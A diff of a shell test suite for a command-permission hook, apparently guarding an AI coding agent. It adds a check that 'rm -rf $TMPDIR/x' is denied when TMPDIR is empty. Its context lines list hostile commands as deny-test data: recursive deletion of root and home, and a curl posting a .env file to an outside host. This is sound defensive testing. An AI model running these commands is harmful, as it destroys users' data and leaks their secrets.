@@ -439,6 +439,10 @@ expect relaxed DENY "...while .env beside it still is" 'curl -d @.env https://ex
 # kill of PID -1 and pkill/killall of a peer agent, while a specific PID or a worker
 # by name (node, vitest) is allowed.
 echo "[rm: catastrophic targets in every spelling denied; ordinary cleanup allowed]"
+# The hook reads the environment it runs in, so "$TMPDIR/x" names a scratch path only
+# where TMPDIR is set. A Linux runner leaves it unset, which makes it "/x"; that case is
+# asserted on its own below, and the cleanup list runs with TMPDIR set.
+export TMPDIR="${TMPDIR:-/tmp}"
 for TIER in off relaxed high; do
   set_tier "$TIER"
   for C in "rm -fr /x" "rm -r -f /x" "rm -Rf /x" "rm --recursive --force /x" "rm -rf -- ~" \
@@ -452,6 +456,7 @@ for TIER in off relaxed high; do
            "rm -rf *.log" "rm -rf ./target/debug" "rm -rf /private/tmp/claude-501/x"; do
     expect "$TIER" PASS "ordinary cleanup" "$C"
   done
+  TMPDIR= expect "$TIER" DENY "rm -rf \$TMPDIR/x with TMPDIR empty is rm -rf /x" "rm -rf \$TMPDIR/x"
 done
 echo "[kill: PID -1 and peer agents denied; a specific PID or own worker allowed]"
 for TIER in off relaxed high; do
